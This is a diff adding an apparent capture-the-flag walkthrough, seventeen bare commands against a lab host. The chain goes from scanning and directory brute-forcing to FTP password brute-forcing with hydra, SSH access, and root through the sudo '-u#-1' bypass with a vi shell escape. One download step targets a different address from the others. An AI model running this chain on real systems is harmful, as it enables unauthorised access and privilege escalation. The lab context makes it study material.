@@ -1,0 +1,17 @@
+1 - nmap -A -p- 10.10.157.185
+2 - gobuster dir -u http://10.10.157.185 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source:http://10.10.157.185/assets/style.css
+4 - wget http://10.10.188.161/WExYY2Cv-qU/Hot_Babe.png
+5 - strings Hot_Babe.png
+6 - hydra -l ftpuser -P pass.txt ftp://10.10.157.185
+7 - ftp 10.10.157.185 
+8 - cat Eli's_Creds.txt -> BRAINFUCK DECODE
+9 - ssh eli@10.10.157.185
+10 - find / -type d -name "*s3cr3t*" 2>/dev/null
+11 - cat /usr/games/s3cr3t/th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+12 - su gwendoline
+13 - cat /home/gwendoline/user.txt
+14 - sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+15 - :!/bin/bash
+16 - whoami
+17 - cat /root/root.txt
